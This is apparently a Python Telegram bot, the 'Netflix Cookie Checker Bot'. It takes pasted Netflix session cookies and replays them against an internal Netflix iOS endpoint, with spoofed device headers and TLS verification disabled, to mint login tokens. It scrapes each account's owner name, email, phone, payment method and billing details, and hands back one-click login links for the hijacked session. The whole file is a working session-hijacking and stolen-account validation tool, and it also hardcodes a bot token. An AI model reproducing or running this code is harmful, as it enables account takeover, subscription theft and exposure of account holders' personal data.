import os
import asyncio
import logging
import re
from typing import Dict, Optional, Tuple
import time
from threading import Thread
import sys
import json
import codecs
import requests
import html
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

BOT_TOKEN = os.environ.get("8915335839:AAGRpBFdulQwjjsaKvhZ-aiEUtY7VQdjV3o")
PORT = int(os.environ.get("PORT", 8000))
app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running fine!", 200

def run_web_server():
    app.run(host="0.0.0.0", port=PORT)

# Start web server in background thread
Thread(target=run_web_server, daemon=True).start()
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

application = None

START_TEXT = (
    "👋 **Netflix Cookie Checker Bot**\n\n"
    "Paste your Netflix cookies here.\n\n"
    "Accepted formats:\n"
    "• Full `Cookie:` header line\n"
    "• Netscape format - tab or space delimited\n"
    "• JSON array format\n"
    "• Key=Value pairs: NetflixId=...; SecureNetflixId=...; nfvdid=...\n\n"
    "Send cookies now:\n\n"
    " Bot by @zyokr 🦖"
)

HELP_TEXT = (
    "How it works:\n"
    "• Use /start then paste cookies.\n"
    "• Bot validates cookies using Netflix API.\n"
    "• If valid, bot converts it into session login links with full account details."
)

COOKIE_KV_RE = re.compile(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", re.DOTALL)


def _is_json_cookie(text: str) -> bool:
    """Check if text is JSON cookie array."""
    text = text.strip()
    if not (text.startswith('[') and text.endswith(']')):
        return False
    try:
        json.loads(text)
        return True
    except Exception:
        return False

def _is_netscape_cookie(text: str) -> bool:
    """Check if text is Netscape format cookie (tab or space delimited)."""
    lines = text.strip().split('\n')
    if len(lines) < 1:
        return False
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        if '\t' in line:
            parts = line.split('\t')
            if len(parts) >= 7:
                return True
        else:
            parts = line.split()
            if len(parts) >= 7:
                domain = parts[0]
                flag = parts[1]
                path = parts[2]
                secure = parts[3]
                try:
                    _ = int(parts[4])
                    if domain.startswith('.') and flag in ['TRUE', 'FALSE'] and path == '/' and secure in ['TRUE', 'FALSE']:
                        return True
                except (ValueError, IndexError):
                    continue
    return False


def _looks_like_cookie_header(text: str) -> bool:
    t = text.strip().lower()
    return t.startswith("cookie:") or (";" in text and "=" in text)


def _extract_json_cookies(json_str: str) -> Dict[str, str]:
    """Extract cookies from JSON array format."""
    try:
        cookies_array = json.loads(json_str)
        kv: Dict[str, str] = {}
        if isinstance(cookies_array, list):
            for cookie_obj in cookies_array:
                if isinstance(cookie_obj, dict):
                    name = cookie_obj.get('name', '')
                    value = cookie_obj.get('value', '')
                    if name and value:
                        kv[name] = value
        return kv
    except Exception as e:
        logger.error(f"Error parsing JSON cookies: {e}")
        return {}


def _extract_netscape_cookies(netscape_str: str) -> Dict[str, str]:
    """Extract cookies from Netscape format."""
    kv: Dict[str, str] = {}
    lines = netscape_str.strip().split('\n')
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        delimiter = '\t' if '\t' in line else ' '
        parts = line.split(delimiter)
        
        if len(parts) >= 7:
            try:
                name = parts[5]
                if delimiter == '\t':
                    value = parts[6]
                else:
                    match = re.match(r'^(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.+)$', line)
                    value = match.group(7).strip() if match else ' '.join(parts[6:])
                
                if name and value:
                    kv[name] = value
            except Exception:
                continue
    return kv


def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
    cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", text).strip()
    parts = [p.strip() for p in cleaned.split(";") if p.strip()]
    if len(parts) == 1 and "\n" in cleaned:
        parts = [p.strip() for p in cleaned.splitlines() if p.strip()]

    kv: Dict[str, str] = {}
    for part in parts:
        m = COOKIE_KV_RE.match(part)
        if m:
            kv[m.group(1).strip()] = m.group(2).strip()
    return kv


def _build_cookie_header(cookie_input: str) -> Optional[str]:
    """Parse any cookie format and build a cookie header string."""
    if _is_json_cookie(cookie_input):
        kv = _extract_json_cookies(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
    
    if _is_netscape_cookie(cookie_input):
        kv = _extract_netscape_cookies(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
    
    if _looks_like_cookie_header(cookie_input):
        cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()
        if "=" not in cleaned:
            return None
        kv = _extract_cookie_kv_pairs(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
        return cleaned

    kv = _extract_cookie_kv_pairs(cookie_input)
    if kv:
        return "; ".join([f"{k}={v}" for k, v in kv.items()])
    return None


def _safe_preview_cookie_keys(cookie_header: str) -> str:
    names = []
    for token in cookie_header.split(";"):
        token = token.strip()
        if "=" in token:
            names.append(token.split("=", 1)[0].strip())
    names = [n for n in names if n]
    return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")


NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
    for token in cookie_header.split(";"):
        token = token.strip()
        if not token or "=" not in token:
            continue
        k, v = token.split("=", 1)
        if k.strip().lower() == "netflixid":
            return v.strip()
    return None


def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, str, Optional[str]]:
    netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)
    if not netflix_id:
        return False, "Invalid or expired cookie. NetflixId not found.", None

    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        r = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers,
            timeout=timeout_s,
            verify=False,
        )
        r.raise_for_status()
        data = r.json()

        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        nftoken = td.get("token")

        if not nftoken:
            return False, "Invalid or expired cookie. Token generation failed.", None

        return True, "Token API returned a valid nftoken.", nftoken
    except Exception as e:
        logger.error(f"Error generating nftoken: {e}")
        return False, "Invalid or expired cookie.", None


def decode_text(value):
    if value is None:
        return "Unknown"
    value = str(value)
    try:
        value = codecs.decode(value, "unicode_escape")
    except Exception:
        pass
    value = html.unescape(value)
    value = re.sub(
        r'\\x([0-9A-Fa-f]{2})',
        lambda m: bytes.fromhex(m.group(1)).decode('latin1'),
        value
    )
    return value.strip()


def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, str]:
    cookie_dict: Dict[str, str] = {}
    for token in cookie_header.split(";"):
        token = token.strip()
        if not token or "=" not in token:
            continue
        k, v = token.split("=", 1)
        cookie_dict[k.strip()] = v.strip()

    if not cookie_dict.get("NetflixId"):
        return {"ok": False, "reason": "No NetflixId found in cookies"}

    session = requests.Session()
    session.cookies.update(cookie_dict)

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }

    urls = [
        "https://www.netflix.com/YourAccount",
        "https://www.netflix.com/account",
        "https://www.netflix.com/account/membership",
    ]

    try:
        resp = None
        txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=timeout_s, allow_redirects=True, verify=False)
                if r.status_code == 200 and "Account" in (r.text or ""):
                    resp = r
                    txt = r.text or ""
                    break
            except Exception:
                continue

        if not resp or resp.status_code != 200:
            return {"ok": False, "reason": f"HTTP {resp.status_code if resp else 'error'}"}

        if ("login" in (resp.url or "").lower()) or ("signin" in (resp.url or "").lower()):
            return {"ok": False, "reason": "Redirected to login"}

        def find(pattern: str) -> Optional[str]:
            m = re.search(pattern, txt)
            return decode_text(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        country = (
            find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
            or find(r'"countryCode"\s*:\s*"([^"]+)"')
            or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        )
        email = (
            find(r'"emailAddress"\s*:\s*"([^"]+)"')
            or find(r'"email"\s*:\s*"([^"]+)"')
            or find(r'"loginId"\s*:\s*"([^"]+)"')
        )
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = (
            find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
            or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
        )
        plan_price = (
            find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        )
        payment = (
            find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        )
        phone = (
            find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
            or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        )
        quality = (
            find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        )
        streams = (
            find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
            or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        )
        
        hold = "Yes" if re.search(r'(?i)(membership|payment|account)\s+is?\s*on\s+hold|"accountstatus":"hold"|"ishold":true', txt) else "No"
        extra = "Yes" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else "No"
        email_ver = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
        ms = find(r'"membershipStatus":\s*"([^"]+)"') or "CURRENT_MEMBER"

        profiles: list = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=15, verify=False)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "")
                if not profiles:
                    profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text or "")
                if not profiles:
                    profiles = re.findall(r'"name"\s*:\s*"([^"]+)"', rp.text or "")
        except Exception:
            pass

        profiles_str = (
            ", ".join(decode_text(p) for p in profiles)
            if profiles else (name or "Unknown")
        )

        return {
            "ok": True,
            "name": name or "Unknown",
            "email": email or "Unknown",
            "country": country or "Unknown",
            "plan": plan_raw or "Unknown",
            "plan_price": plan_price or "N/A",
            "member_since": member_since or "Unknown",
            "next_billing": next_billing or "Unknown",
            "payment_method": payment or "CC",
            "phone": phone or "N/A",
            "has_phone": "Yes" if phone else "No",
            "video_quality": quality or "HD",
            "max_streams": streams or "2",
            "on_payment_hold": hold,
            "extra_member": extra,
            "email_verified": email_ver,
            "membership_status": ms,
            "profiles": profiles_str,
            "connected_profiles": str(len(profiles)) if profiles else "1"
        }
    except Exception as e:
        logger.error(f"Error checking netflix cookie: {e}")
        return {"ok": False, "reason": str(e)}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text(START_TEXT, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error in start: {e}")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text(HELP_TEXT)
    except Exception as e:
        logger.error(f"Error in help: {e}")


async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return

        user_id = update.effective_user.id
        cookie_input = (update.message.text or "").strip()
        
        if not cookie_input:
            await update.message.reply_text("Please paste your cookies.")
            return

        cookie_header = _build_cookie_header(cookie_input)
        if not cookie_header:
            await update.message.reply_text(
                "❌ Could not parse cookies.\n\n"
                "Paste in one of these formats:\n"
                "• Full `Cookie:` header line\n"
                "• Netscape format (.txt cookie file)\n"
                "• JSON array format\n"
                "• Key=Value pairs (NetflixId=..., SecureNetflixId=...)"
            )
            return

        preview = _safe_preview_cookie_keys(cookie_header)
        msg = await update.message.reply_text(f"🔎 Checking Netflix cookies...\n(Keys: {preview})")

        loop = asyncio.get_running_loop()
        ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)

        if ok and nftoken:
            acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)

            phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
            desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"

            # Formatted single-bullet account list
            formatted_text = (
                "📁 **Source:**\n"
                "pasted_cookie.txt\n"
                "✅ **Status:** Valid Premium Account\n\n"
                "👤 **Account Details:**\n"
                f"• **Name:** {acct.get('name', 'Unknown')}\n"
                f"• **Email:** {acct.get('email', 'Unknown')}\n"
                f"• **Country:** {acct.get('country', 'Unknown')}\n"
                f"• **Plan:** {acct.get('plan', 'Unknown')}\n"
                f"• **Price:** {acct.get('plan_price', 'N/A')}\n"
                f"• **Member Since:** {acct.get('member_since', 'Unknown')}\n"
                f"• **Next Billing:** {acct.get('next_billing', 'Unknown')}\n"
                f"• **Payment:** {acct.get('payment_method', 'CC')}\n"
                f"• **Phone:** {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
                f"• **Quality:** {acct.get('video_quality', 'HD')}\n"
                f"• **Streams:** {acct.get('max_streams', '2')}\n"
                f"• **Hold Status:** {acct.get('on_payment_hold', 'No')}\n"
                f"• **Extra Member:** {acct.get('extra_member', 'No')}\n"
                f"• **Extra Member Slot:** Unknown\n"
                f"• **Email Verified:** {acct.get('email_verified', 'No')}\n"
                f"• **Membership Status:** {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
                f"• **Connected Profiles:** {acct.get('connected_profiles', '1')}\n"
                f"• **Profiles:** {acct.get('profiles', 'Unknown')}"
            )

            # Inline buttons for direct link logins
            keyboard = [
                [
                    InlineKeyboardButton("💻 PC Login", url=desktop_link),
                    InlineKeyboardButton("📱 Phone Login", url=phone_link)
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await msg.edit_text(
                formatted_text,
                parse_mode="Markdown",
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            logger.info(f"✅ Cookie validation successful for {user_id}")
        else:
            await msg.edit_text(f"❌ {detail}")
            logger.warning(f"❌ Cookie validation failed for {user_id}: {detail}")
    except Exception as e:
        logger.error(f"Error in handle_cookie_text: {e}", exc_info=True)
        try:
            await update.message.reply_text("❌ Error processing request")
        except Exception:
            pass


def run_bot_in_thread():
    global application
    
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set!")
        return
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        application = ApplicationBuilder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))
        
        loop.run_until_complete(
            application.run_polling(
                allowed_updates=Update.ALL_TYPES,
                stop_signals=()
            )
        )
    except Exception as e:
        logger.error(f"❌ Bot error: {e}", exc_info=True)
        application = None


@app.route("/health", methods=["GET"])
def health():
    return {
        "status": "healthy" if application else "unhealthy",
        "bot_running": application is not None,
        "bot_token_set": bool(BOT_TOKEN),
        "timestamp": time.time()
    }, 200 if application else 503


if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN environment variable is not set!")
        sys.exit(1)
    
    bot_thread = Thread(target=run_bot_in_thread, daemon=False)
    bot_thread.start()
    
    time.sleep(5)
    
    try:
        app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False, threaded=True)
    except KeyboardInterrupt:
        sys.exit(0)
